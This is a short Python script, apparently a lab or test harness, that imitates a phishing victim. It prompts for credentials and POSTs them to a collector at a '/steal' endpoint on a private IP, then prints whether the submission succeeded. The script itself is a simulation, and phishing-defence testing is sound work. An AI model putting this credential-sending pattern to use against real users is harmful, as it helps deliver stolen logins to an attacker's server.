#!/usr/bin/env python3
import urllib.request
import urllib.parse

phish_url = input("Phishing submit URL [http://192.168.10.50/steal]: ").strip()
if not phish_url:
    phish_url = "http://192.168.10.50/steal"

username = input("Username for fake login: ").strip()
password = input("Password for fake login: ").strip()

data = urllib.parse.urlencode({
    "username": username,
    "password": password
}).encode()

req = urllib.request.Request(phish_url, data=data, method="POST")

try:
    resp = urllib.request.urlopen(req, timeout=5)
    print("phish_submit_status=%s" % resp.status)
    print("phish_credentials_submitted=yes")
    print("submitted_username=%s" % username)
except Exception as e:
    print("phish_submit_error=%s" % e)
